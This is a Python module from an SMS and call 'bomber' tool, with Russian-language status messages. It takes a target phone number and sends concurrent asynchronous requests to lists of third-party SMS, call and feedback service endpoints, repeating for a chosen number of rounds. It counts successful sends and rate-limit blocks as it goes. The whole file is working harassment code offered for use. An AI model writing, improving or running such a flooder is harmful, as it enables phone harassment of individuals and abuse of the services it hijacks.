from asyncio import ensure_future, gather, run
from aiohttp import ClientSession
from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config
from colorama import Fore

async def request(session, url, counts):
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']
        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=10) as response:
                if response.status == 200:
                    counts['success'] += 1
                elif response.status == 429:
                    counts['code_429'] += 1
                elif response.status == 403:
                    counts['code_403'] += 1

                output = (Fore.MAGENTA + f'\rЦикл: {counts["round"]}' + Fore.RESET + ' | ' +
                          Fore.CYAN + f'Успешно: {counts["success"]}' + Fore.RESET + ' | ' + 
                          Fore.YELLOW + f'Блок: {counts["code_429"]}' + Fore.RESET + ' | ' + 
                          Fore.RED + f'Ошибка: {counts["code_403"]}').ljust(80)
                
                print(output, end='')  
                
                return await response.text()
    except:
        pass

async def async_attacks(number, counts):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        tasks = [ensure_future(request(session, service, counts)) for service in services]
        await gather(*tasks)

counts = {'success': 0, 'code_429': 0, 'code_403': 0, 'round': 0}
def start_async_attacks(number, replay):
    '''Запуск бомбера'''

    for _ in range(int(replay)):
        counts['round'] += 1 
        run(async_attacks(number, counts))
